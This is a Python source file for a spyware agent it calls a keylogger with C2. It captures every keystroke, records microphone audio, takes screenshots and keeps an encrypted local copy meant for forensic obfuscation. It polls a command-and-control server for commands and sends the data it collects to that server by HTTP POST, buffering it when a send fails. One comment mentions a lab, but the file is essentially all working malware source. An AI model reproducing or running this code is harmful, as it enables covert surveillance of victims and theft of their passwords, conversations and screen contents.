import os
import time
import threading
import json
import uuid
import requests
import io

# Libraries for keylogging
from pynput import keyboard

# Libraries for screenshot (Requires: pip install mss Pillow)
try:
    import mss
    from PIL import Image
    import base64
except ImportError:
    print("WARNING: mss or Pillow not found. Screenshot capture disabled.")
    mss = None
    Image = None
    base64 = None

# Libraries for audio recording (Requires: pip install pyaudio)
try:
    import pyaudio
except ImportError:
    print("WARNING: PyAudio not found. Audio capture disabled.")
    pyaudio = None

# Library for local encryption (Requires: pip install cryptography)
try:
    from cryptography.fernet import Fernet
except ImportError:
    print("WARNING: cryptography (Fernet) not found. Local encryption disabled.")
    Fernet = None

# Custom configuration file (must exist in the same directory)
# Assurez-vous que le fichier config.py est à jour avec les variables C2_COMMAND_URL et COMMAND_CHECK_INTERVAL.
from config import (
    SERVER_URL, 
    SEND_INTERVAL, 
    AUDIO_RECORD_SECONDS, 
    AUDIO_RATE, 
    SCREENSHOT_INTERVAL, 
    INITIAL_COMM_MODE,
    C2_COMMAND_URL,
    COMMAND_CHECK_INTERVAL
)

# --- GLOBAL STATE AND CONFIGURATION ---

# Unique identifier for this victim instance
victim_id = str(uuid.uuid4())

# Key for local encryption (Generated once per session for this lab)
# In a real scenario, this would be derived from a consistent machine ID or sent to C2.
if Fernet:
    ENCRYPTION_KEY = Fernet.generate_key()
    cipher = Fernet(ENCRYPTION_KEY)
else:
    cipher = None

# Events buffer before sending
events = []
events_lock = threading.Lock() # Lock for thread-safe access to 'events' list

# State variables controlled by C2 commands
is_capturing = True
comm_mode = INITIAL_COMM_MODE # "http" or "tcp"

# Local buffer file for resilience
BUFFER_FILE = os.path.join(os.getcwd(), "buffer.jsonl") 
if not os.path.exists(BUFFER_FILE):
    with open(BUFFER_FILE, 'w') as f:
        pass # Create the file if it doesn't exist

# -------------------------------------------------------------------
# --- UTILITIES ---
# -------------------------------------------------------------------

def save_local_encrypted(event_data):
    """Encrypts and appends a single event to a local log file for forensic obfuscation."""
    global victim_id, cipher

    if not cipher:
        return # Skip if Fernet is not available

    try:
        data_to_encrypt = json.dumps({"victim_id": victim_id, "event": event_data}).encode('utf-8')
        encrypted_data = cipher.encrypt(data_to_encrypt)
        
        with open("encrypted_log.jsonl", "a") as f:
            f.write(encrypted_data.decode('utf-8') + "\n")
            
    except Exception as e:
        # print(f"[Encryption Error] {e}")
        pass

def read_buffer():
    """Reads all events from the local buffer file and clears the file."""
    buffered_events = []
    try:
        # Read all lines
        with open(BUFFER_FILE, "r") as f:
            for line in f:
                if line.strip():
                    try:
                        buffered_events.append(json.loads(line.strip()))
                    except json.JSONDecodeError:
                        continue # Skip corrupted lines
        
        # Clear the file contents immediately after reading
        with open(BUFFER_FILE, "w") as f:
            f.truncate(0)
            
    except Exception as e:
        print(f"[Buffer Error] Failed to read buffer: {e}")
        pass
        
    return buffered_events

def write_to_buffer(data_list):
    """Writes a list of events back to the local buffer file."""
    try:
        with open(BUFFER_FILE, "a") as f:
            for event in data_list:
                f.write(json.dumps(event) + "\n")
    except Exception as e:
        print(f"[Buffer Error] Failed to write to buffer: {e}")

# -------------------------------------------------------------------
# --- C2 COMMAND AND CONTROL ---
# -------------------------------------------------------------------

def execute_command(action):
    """Executes the command received from the C2 server."""
    global is_capturing, comm_mode
    
    print(f"\n[COMMAND EXEC] Received command: {action}")
    
    if action == "stop_capture":
        is_capturing = False
        print("[CONTROL] Capture stopped.")
    
    elif action == "start_capture":
        is_capturing = True
        print("[CONTROL] Capture started.")
        
    elif action.startswith("switch_mode:"):
        _, new_mode = action.split(":")
        if new_mode in ["http", "tcp"]:
            comm_mode = new_mode
            print(f"[CONTROL] Communication mode switched to {comm_mode}.")
        else:
            print(f"[CONTROL] Invalid mode switch attempted: {new_mode}")
            
    elif action == "flush_logs":
        # Force the sender to run immediately. 
        # Since the sender thread is daemon and runs on a timer,
        # we can't truly 'interrupt' it easily without complex thread primitives.
        # In a robust implementation, this would use a Condition variable or Event.
        print("[CONTROL] Flushing logs requested. Will execute on next send cycle.")
        
    else:
        print(f"[CONTROL] Unknown command: {action}")

def command_routine():
    """Thread that polls the C2 server for new commands."""
    global victim_id
    
    command_url = f"{C2_COMMAND_URL}/{victim_id}"
    print(f"[COMMAND] Starting command poll thread. C2 URL: {command_url}")
    
    while True:
        try:
            # Polling the server for a command
            r = requests.get(command_url, timeout=3)
            if r.status_code == 200:
                command_data = r.json()
                action = command_data.get("action")
                
                if action and action != "none":
                    execute_command(action)
            
        except requests.exceptions.RequestException:
            # Silence connection/timeout errors during polling
            pass 
            
        time.sleep(COMMAND_CHECK_INTERVAL)

# -------------------------------------------------------------------
# --- CAPTURE ROUTINES ---
# -------------------------------------------------------------------

# 1. Keyboard Capture
def on_press(key):
    global is_capturing
    if not is_capturing:
        return
    
    ts = time.time()
    try:
        # Check if the key is a standard character
        k = key.char
    except AttributeError:
        # Key is a special key (e.g., Key.space, Key.enter)
        k = str(key)

    event = {"timestamp": ts, "type": "keyboard", "key": k}
    
    with events_lock:
        events.append(event)
    
    save_local_encrypted(event)

def on_release(key):
    # This keylogger does not log 'release' events, only 'press'
    # return False would stop the listener, which we don't want
    pass

# 2. Audio Capture
def audio_capture_routine():
    global is_capturing
    
    if not pyaudio:
        return

    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1 # Mono
    
    try:
        p = pyaudio.PyAudio()
    except Exception as e:
        print(f"[Audio Error] Cannot initialize PyAudio: {e}")
        return

    while True:
        try:
            if is_capturing:
                stream = p.open(format=FORMAT,
                                channels=CHANNELS,
                                rate=AUDIO_RATE,
                                input=True,
                                frames_per_buffer=CHUNK)

                frames = []
                # Calculate number of chunks needed for the duration
                num_chunks = int(AUDIO_RATE / CHUNK * AUDIO_RECORD_SECONDS)

                for i in range(num_chunks):
                    data = stream.read(CHUNK)
                    frames.append(data)

                stream.stop_stream()
                stream.close()

                # Concatenate the PCM raw data
                raw_audio_data = b''.join(frames)
                
                # Base64 encode for JSON transport
                encoded_audio = base64.b64encode(raw_audio_data).decode('utf-8')

                audio_event = {
                    "timestamp": time.time(), 
                    "type": "audio", 
                    "duration": AUDIO_RECORD_SECONDS, 
                    "rate": AUDIO_RATE,
                    "channels": CHANNELS,
                    "format": "pcm16", # Raw PCM 16-bit
                    "data": encoded_audio
                }
                
                with events_lock:
                    events.append(audio_event)
                save_local_encrypted(audio_event)
                print(f"[Audio] Audio event of {AUDIO_RECORD_SECONDS}s captured and encrypted.")

        except Exception as e:
            # print(f"[Audio Error] Capture failed: {e}")
            pass
        
        # Ensure capture interval is respected even if capture is paused or failed
        time.sleep(AUDIO_RECORD_SECONDS)

    p.terminate()

# 3. Screenshot Capture
def screenshot_capture_routine():
    global is_capturing
    
    if not mss or not Image or not base64:
        return

    try:
        with mss.mss() as sct:
            while True:
                if is_capturing:
                    # Capture the primary monitor
                    monitor = sct.monitors[1] 
                    sct_img = sct.grab(monitor)
                    
                    # Convert to PIL Image for compression
                    img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
                    
                    # Save to an in-memory buffer as PNG
                    img_buffer = io.BytesIO()
                    img.save(img_buffer, format="PNG")
                    img_bytes = img_buffer.getvalue()

                    # Base64 encode for JSON transport
                    encoded_image = base64.b64encode(img_bytes).decode('utf-8')

                    screenshot_event = {
                        "timestamp": time.time(),
                        "type": "screenshot",
                        "data": encoded_image
                    }
                    
                    with events_lock:
                        events.append(screenshot_event)
                    save_local_encrypted(screenshot_event)
                    print(f"[Screenshot] Screenshot captured and encrypted. Size: {len(encoded_image) // 1024} KB")

                time.sleep(SCREENSHOT_INTERVAL) # Sleep always happens
                    
    except Exception as e:
        print(f"[Screenshot Error] Capture failed: {e}")

# -------------------------------------------------------------------
# --- EXFILTRATION ROUTINE ---
# -------------------------------------------------------------------

def send_events_http(victim_id, events_list):
    """Sends events to the C2 server via HTTP POST."""
    payload = {
        "victim_id": victim_id,
        "events": events_list
    }

    try:
        # Use requests.post for HTTP
        r = requests.post(SERVER_URL, json=payload, timeout=3)
        return r.status_code == 200
    except requests.exceptions.RequestException:
        # print(f"[Sender] HTTP connection failed.")
        return False

# NOTE: The TCP mode implementation is only a placeholder here,
# the actual logic would need a socket connection and custom protocol.
def send_events_tcp(victim_id, events_list):
    """Placeholder for sending events via TCP Socket."""
    # print("[Sender] Attempting TCP send (Placeholder)...")
    time.sleep(1) 
    # Assume failure for placeholder
    return False 

def send_routine():
    """Thread that manages the periodic exfiltration of logs, handling resilience."""
    global victim_id, events, comm_mode, SEND_INTERVAL
    
    while True:
        time.sleep(SEND_INTERVAL)

        with events_lock:
            # 1. Read buffered events first
            buffered = read_buffer()
            
            # 2. Combine with new events
            to_send = buffered + events
            
            # 3. Clear the main event list if we have data to send
            if to_send:
                events.clear()
            else:
                continue # Nothing to send

        # Determine which function to use based on current communication mode
        sender_func = send_events_http if comm_mode == "http" else send_events_tcp
        
        # 4. Attempt to send
        if sender_func(victim_id, to_send):
            print(f"[Sender] Successfully sent {len(to_send)} events via {comm_mode}.")
        else:
            # 5. Resilience: If sending fails, write all events back to the buffer
            write_to_buffer(to_send)
            print(f"[Sender] Send failed. Wrote {len(to_send)} events back to buffer.")


# -------------------------------------------------------------------
# --- MAIN EXECUTION ---
# -------------------------------------------------------------------

if __name__ == "__main__":
    print(f"Keylogger C2 Active (UUID={victim_id})")

    # 1. Start the sender thread (daemon so it closes when main thread exits)
    t_sender = threading.Thread(target=send_routine, daemon=True)
    t_sender.start()
    
    # 2. Start the audio capture thread
    if pyaudio:
        t_audio = threading.Thread(target=audio_capture_routine, daemon=True)
        t_audio.start()

    # 3. Start the screenshot capture thread
    if mss and Image and base64:
        t_screenshot = threading.Thread(target=screenshot_capture_routine, daemon=True)
        t_screenshot.start()
    
    # 4. START COMMAND POLLER
    t_command = threading.Thread(target=command_routine, daemon=True)
    t_command.start()
    
    # 5. Start the keyboard listener (main blocking thread)
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    # Wait for the listener to stop (which it won't unless manually killed)
    listener.join()
    
    print("End of the program.")